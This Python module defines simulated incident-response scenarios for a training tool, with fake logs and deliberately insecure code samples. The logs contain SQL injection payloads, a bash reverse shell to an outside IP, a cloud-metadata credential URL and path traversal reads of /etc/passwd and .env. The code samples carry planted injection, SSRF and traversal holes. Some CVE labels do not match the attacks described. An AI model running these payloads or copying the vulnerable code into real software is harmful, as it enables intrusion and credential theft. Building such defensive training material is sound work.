"""Preset real-world incident scenarios for Cyber-Nova."""

from typing import Dict, Any, List
from ..models import Incident, IncidentSeverity, IncidentStatus


def get_scenario_presets() -> Dict[str, Dict[str, Any]]:
    return {
        "sql_injection_portal": {
            "id": "INC-2024-8921",
            "name": "Critical SQL Injection in Customer Portal API",
            "cve": "CVE-2024-28987",
            "severity": IncidentSeverity.CRITICAL,
            "description": (
                "Automated vulnerability scanners and unauthenticated requests detected exploiting "
                "an unescaped SQL query in the e-commerce customer order lookup endpoint. "
                "Attackers successfully dumped database tables including sensitive credentials."
            ),
            "telemetry_logs": [
                "2026-11-23T05:42:11.104Z [NGINX-EDGE] 198.51.100.42 - GET /api/v1/orders?customer_id=101 HTTP/1.1 200 412 'Mozilla/5.0'",
                "2026-11-23T05:42:15.820Z [NGINX-EDGE] 198.51.100.42 - GET /api/v1/orders?customer_id=101'%20OR%201=1%20-- HTTP/1.1 200 8941 'sqlmap/1.7.2#stable'",
                "2026-11-23T05:42:18.330Z [NGINX-EDGE] 198.51.100.42 - GET /api/v1/orders?customer_id=101'%20UNION%20SELECT%20null,username,password_hash,null%20FROM%20users-- HTTP/1.1 200 15200 'sqlmap/1.7.2#stable'",
                "2026-11-23T05:42:20.912Z [DB-MONITOR] Alert: High query volume & anomalous UNION operation executed on database 'ecommerce.db' by web-worker-03",
                "2026-11-23T05:42:22.001Z [SIEM-CORRELATION] Rule Triggered: Automated SQL Injection & Database Exfiltration (Severity: CRITICAL, CVE-2024-28987)"
            ],
            "source_files": {
                "order_service.py": (
                    "import sqlite3\n"
                    "from typing import List, Dict, Any\n\n"
                    "def get_customer_orders(customer_id: str) -> List[Dict[str, Any]]:\n"
                    "    \"\"\"Fetches all active orders associated with a customer account.\"\"\"\n"
                    "    conn = sqlite3.connect('ecommerce.db')\n"
                    "    cursor = conn.cursor()\n"
                    "    # Insecure query construction with string formatting\n"
                    "    query = f\"SELECT id, customer, amount, status FROM orders WHERE customer_id = '{customer_id}'\"\n"
                    "    cursor.execute(query)\n"
                    "    rows = cursor.fetchall()\n"
                    "    conn.close()\n"
                    "    return rows\n"
                )
            }
        },
        "command_injection_diagnostics": {
            "id": "INC-2024-9142",
            "name": "Remote Code Execution via Diagnostics Ping Service",
            "cve": "CVE-2024-23897",
            "severity": IncidentSeverity.CRITICAL,
            "description": (
                "Remote attacker exploited unsanitized input passed to shell interpreter in the "
                "network diagnostics utility, spawning reverse interactive shells to external C2 node."
            ),
            "telemetry_logs": [
                "2026-11-23T05:45:01.002Z [API-GATEWAY] 203.0.113.88 - POST /api/v1/diagnostics/ping HTTP/1.1 200 102 'curl/7.88.1'",
                "2026-11-23T05:45:03.450Z [API-GATEWAY] 203.0.113.88 - POST /api/v1/diagnostics/ping payload='127.0.0.1; whoami; id' HTTP/1.1 200 488 'curl/7.88.1'",
                "2026-11-23T05:45:05.110Z [API-GATEWAY] 203.0.113.88 - POST /api/v1/diagnostics/ping payload='127.0.0.1; /bin/bash -i >& /dev/tcp/198.51.100.42/4444 0>&1' HTTP/1.1 200 0 'curl/7.88.1'",
                "2026-11-23T05:45:06.290Z [EDR-AUDIT] Unauthorized child process '/bin/bash' spawned by parent 'python3 (pid: 1420)' with shell redirection",
                "2026-11-23T05:45:07.011Z [NET-FIREWALL] Blocked egress TCP connection attempt to 198.51.100.42:4444 (Threat: Command & Control T1041)"
            ],
            "source_files": {
                "diagnostics.py": (
                    "import subprocess\n\n"
                    "def run_network_diagnostic(host_address: str) -> str:\n"
                    "    \"\"\"Executes network reachability check on host.\"\"\"\n"
                    "    # Insecure: dynamic string concatenated into shell command with shell=True\n"
                    "    cmd = f\"ping -c 1 {host_address}\"\n"
                    "    result = subprocess.check_output(cmd, shell=True, text=True)\n"
                    "    return result\n"
                )
            }
        },
        "ssrf_cloud_metadata": {
            "id": "INC-2024-7703",
            "name": "Cloud Metadata SSRF & IAM Role Harvest",
            "cve": "CVE-2024-21626",
            "severity": IncidentSeverity.HIGH,
            "description": (
                "Webhook preview endpoint queried by external attacker was tricked into retrieving "
                "internal AWS IMDSv1 metadata, exposing production IAM temporary security credentials."
            ),
            "telemetry_logs": [
                "2026-11-23T05:48:10.010Z [WAF-PROXY] 198.51.100.42 - POST /api/v1/fetch-url {'url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'} HTTP/1.1 200",
                "2026-11-23T05:48:12.330Z [CLOUD-AUDIT] Anomaly: High frequency IMDS credential queries originating from container app-srv-99",
                "2026-11-23T05:48:13.500Z [GUARD-DUTY] Alert: IAM Role 'ProductionClusterExecutionRole' harvested via SSRF vector (CVE-2024-21626)"
            ],
            "source_files": {
                "resource_fetcher.py": (
                    "import requests\n\n"
                    "def fetch_remote_resource(target_url: str) -> str:\n"
                    "    \"\"\"Fetches remote preview image or webhook payload.\"\"\"\n"
                    "    # Insecure: outbound HTTP request without host or private IP validation\n"
                    "    resp = requests.get(target_url, timeout=5)\n"
                    "    return resp.text\n"
                )
            }
        },
        "path_traversal_viewer": {
            "id": "INC-2024-6310",
            "name": "Directory Path Traversal & System File Disclosure",
            "cve": "CVE-2024-38856",
            "severity": IncidentSeverity.HIGH,
            "description": (
                "Document viewer API parameter exploited with directory traversal climb "
                "sequences to read arbitrary system configuration and credential files from disk."
            ),
            "telemetry_logs": [
                "2026-11-23T05:50:01.000Z [NGINX] 203.0.113.19 - GET /documents/view?file=invoice_1001.pdf HTTP/1.1 200 4820",
                "2026-11-23T05:50:03.410Z [NGINX] 203.0.113.19 - GET /documents/view?file=../../../../etc/passwd HTTP/1.1 200 2400",
                "2026-11-23T05:50:05.120Z [NGINX] 203.0.113.19 - GET /documents/view?file=../../../../app/.env HTTP/1.1 200 850",
                "2026-11-23T05:50:06.002Z [FILE-INTEGRITY] Access to sensitive system path /etc/passwd detected from web application user"
            ],
            "source_files": {
                "doc_viewer.py": (
                    "import os\n\n"
                    "BASE_DIR = '/var/www/uploads'\n\n"
                    "def view_document(requested_file: str) -> str:\n"
                    "    \"\"\"Reads requested customer document from upload directory.\"\"\"\n"
                    "    # Insecure: joins base dir without verifying that resolved realpath is constrained\n"
                    "    file_path = os.path.join(BASE_DIR, requested_file)\n"
                    "    with open(file_path, 'r') as f:\n"
                    "        return f.read()\n"
                )
            }
        }
    }


def create_incident_from_preset(preset_key: str) -> Incident:
    presets = get_scenario_presets()
    if preset_key not in presets:
        preset_key = "sql_injection_portal"

    p = presets[preset_key]
    return Incident(
        id=p["id"],
        title=p["name"],
        description=p["description"],
        severity=p["severity"],
        status=IncidentStatus.NEW,
        telemetry_logs=list(p["telemetry_logs"]),
        source_files=dict(p["source_files"])
    )
